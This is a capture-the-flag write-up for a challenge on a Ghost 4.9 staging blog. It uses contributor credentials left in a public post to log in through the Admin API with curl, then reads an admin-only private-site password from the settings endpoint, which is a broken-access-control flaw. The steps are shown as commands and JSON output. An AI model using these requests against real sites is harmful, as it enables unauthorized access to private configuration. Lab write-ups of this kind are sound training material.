# Sessionslip

## Challenge Overview

The SessionSlip engineering team runs a self-hosted staging blog where they try out new content before it ships. As the team grew, guest writers and interns were handed a shared low-privilege account, and the login was never rotated. The team assumes sensitive staging configuration is only visible to administrators… but it may not be as locked down as they think.

---

## Evidence

A single target was provided:

- `http://40.90.249.22:34746`

The site presented as a Ghost CMS staging blog.

---

## Analysis

### Initial Recon

The landing page initially appeared to be a generic maintenance page, but the actual blog was fully operational. Quick fingerprinting of the Admin API confirmed the CMS version:

```bash
curl -s http://40.90.249.22:34746/ghost/api/v4/admin/site/
```

Response:

```json
{
  "site": {
    "title": "SessionSlip",
    "description": "Internal staging publication for the SessionSlip engineering team.",
    "version": "4.9"
  }
}
```

Ghost 4.9.

### Credential Leak

A public post at `/welcome-to-sessionslip/` contained the shared low-privilege contributor credentials that the team never rotated:

```
email: alex@session.slip
password: Contributor@2021
```

These were left in cleartext for guest writers and interns.

### Authentication

The credentials were valid against the Admin API session endpoint:

```bash
curl -X POST http://40.90.249.22:34746/ghost/api/v4/admin/session/ \
  -H "Content-Type: application/json" \
  -d '{"username":"alex@session.slip","password":"Contributor@2021"}' \
  -c cookies.txt
```

The server returned `201 Created` and issued a valid `ghost-admin-api-session` cookie.

### Broken Access Control

With the contributor session active, the settings endpoint was queried:

```bash
curl -b cookies.txt http://40.90.249.22:34746/ghost/api/v4/admin/settings/
```

Among the returned settings, the private-site password (group `private`, key `password`) was fully readable:

```json
{
  "id": "6a9d3db1bfff06002153aeee",
  "group": "private",
  "key": "password",
  "value": "flag{[YOUR FLAG HERE]}",
  "type": "string",
  "flags": null
}
```

This value is intended to be visible only to administrators. The contributor role had unrestricted read access to it.

---

## Flag

```
flag{[YOUR FLAG HERE]}
```

---

## Tools Used

- curl
- Python 3 (JSON inspection)
